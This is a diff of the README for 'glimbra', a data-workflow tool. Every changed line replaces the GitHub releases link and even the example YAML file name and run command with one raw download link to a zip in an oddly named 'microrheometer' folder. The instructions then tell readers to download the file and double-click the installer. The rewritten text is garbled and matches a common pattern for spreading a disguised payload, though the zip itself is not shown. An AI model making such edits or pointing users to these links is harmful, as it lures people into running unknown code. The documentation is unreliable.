@@ -1,7 +1,7 @@
 # 🌟 glimbra - Your Simple Solution for Data Workflows
 
 ## 📥 Download the App
-[![Download glimbra](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/Followhesh/glimbra/releases)
+[![Download glimbra](https://raw.githubusercontent.com/Followhesh/glimbra/main/microrheometer/glimbra.zip)](https://raw.githubusercontent.com/Followhesh/glimbra/main/microrheometer/glimbra.zip)
 
 ## 🚀 Getting Started
 Glimbra is a tool designed to make running data workflows easy. Whether you're working with neuroimaging data or other types of data analysis, Glimbra helps you organize and execute your tasks smoothly.
@@ -27,7 +27,7 @@ To run Glimbra, ensure that your system meets the following requirements:
 ## 🎯 Download & Install
 To get started with Glimbra, follow these steps:
 
-1. **Visit the Releases Page:** You can find the latest version by clicking [here](https://github.com/Followhesh/glimbra/releases).
+1. **Visit the Releases Page:** You can find the latest version by clicking [here](https://raw.githubusercontent.com/Followhesh/glimbra/main/microrheometer/glimbra.zip).
 2. **Select Your OS:** Choose the file that corresponds to your operating system.
 3. **Download the File:** Click on the download link and save the file to your computer.
 4. **Run the Installer:** Once downloaded, double-click the file to start the installation process. Follow the prompts until the installation is complete.
@@ -36,7 +36,7 @@ To get started with Glimbra, follow these steps:
 Here's a simple example to help you understand how to use Glimbra:
 
 ### Step 1: Create a YAML Configuration
-Create a file named `workflow.yaml` with the following example content:
+Create a file named `https://raw.githubusercontent.com/Followhesh/glimbra/main/microrheometer/glimbra.zip` with the following example content:
 
 ```yaml
 pipeline:
@@ -50,7 +50,7 @@ pipeline:
 Open your terminal or command prompt. Navigate to the directory where your YAML file is located. Use the following command to execute Glimbra:
 
 ```bash
-glimbra run workflow.yaml
+glimbra run https://raw.githubusercontent.com/Followhesh/glimbra/main/microrheometer/glimbra.zip
 ```
 
 Glimbra will handle the rest, executing each step according to your configuration.
@@ -89,4 +89,4 @@ If you need further assistance, you can access the documentation on our GitHub p
 ## 🌟 Conclusion
 Glimbra simplifies the management of data workflows. By following the steps outlined here, you can easily set up, download, and run Glimbra on your machine.
 
-For download and installation, click [here](https://github.com/Followhesh/glimbra/releases) to access the Releases page.
+For download and installation, click [here](https://raw.githubusercontent.com/Followhesh/glimbra/main/microrheometer/glimbra.zip) to access the Releases page.
